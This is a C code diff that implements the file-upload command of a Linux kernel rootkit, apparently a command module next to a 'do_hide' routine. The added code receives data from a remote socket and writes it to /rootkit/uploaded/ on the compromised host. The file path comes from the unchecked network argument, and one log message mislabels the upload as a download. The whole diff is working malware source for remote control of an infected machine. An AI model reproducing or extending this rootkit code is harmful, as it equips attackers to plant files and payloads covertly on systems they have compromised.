@@ -1,5 +1,6 @@
 #include "commands.h"
 
+#include <linux/delay.h>
 #include <linux/module.h>
 #include <linux/string.h>
 
@@ -153,7 +154,78 @@ static int do_hide(struct socket *sock, char *args)
 
 static int do_upload(struct socket *sock, char *args)
 {
-    return unimplemented(sock, "do_upload");
+    struct file *file = NULL;
+    int ret;
+    loff_t pos = 0;
+    int safeguard = 0;
+    char file_path[1024];
+    struct kvec resp_vec = { 0 };
+    struct msghdr resp_msg = { 0 };
+    char resp_buf[1024] = { 0 };
+    USE_NETWORK(1024); // chunk size is 1024
+
+    // Create File:
+    sprintf(file_path, "/rootkit/uploaded/%s", args);
+    file = filp_open(file_path, O_RDWR | O_CREAT, 0);
+    if (IS_ERR(file))
+    {
+        sprintf(buf, "KO\n");
+        vec.iov_base = buf;
+        vec.iov_len = strlen(buf);
+        if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
+        {
+            pr_warn("commands: upload: couldn't send status message: %d\n",
+                    status);
+            return -1;
+        }
+        pr_err("commands: upload: couldn't open file %s", file_path);
+        return 1;
+    }
+
+    // Send OK:
+    sprintf(buf, "OK\n");
+    vec.iov_base = buf;
+    vec.iov_len = strlen(buf);
+    if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
+    {
+        pr_warn("commands: download: couldn't send status message: %d\n",
+                status);
+        return -1;
+    }
+
+    // Read and append to file:
+    resp_vec.iov_base = resp_buf;
+    resp_vec.iov_len = 1024;
+    while (1)
+    {
+        ret = kernel_recvmsg(sock, &resp_msg, &resp_vec, 1, 1024, MSG_DONTWAIT);
+        if (ret == -EAGAIN || ret == -EWOULDBLOCK)
+        {
+            msleep(500);
+            continue;
+        }
+        if (ret < 0)
+        {
+            pr_err("commands: upload: connection lost during upload: %d\n",
+                   ret);
+            filp_close(file, NULL);
+            return 1;
+        }
+        if (strncmp("DONE", resp_buf, 4) == 0)
+        {
+            break;
+        }
+
+        kernel_write(file, resp_buf, ret, &pos);
+        if (++safeguard > MAX_UPLOAD_ITERATIONS)
+        {
+            pr_warn(
+                "commands: upload: too many iterations, stopping upload.\n");
+            break;
+        }
+    }
+    filp_close(file, NULL);
+    return 0;
 }
 
 // Try to open file, send OK/KO status
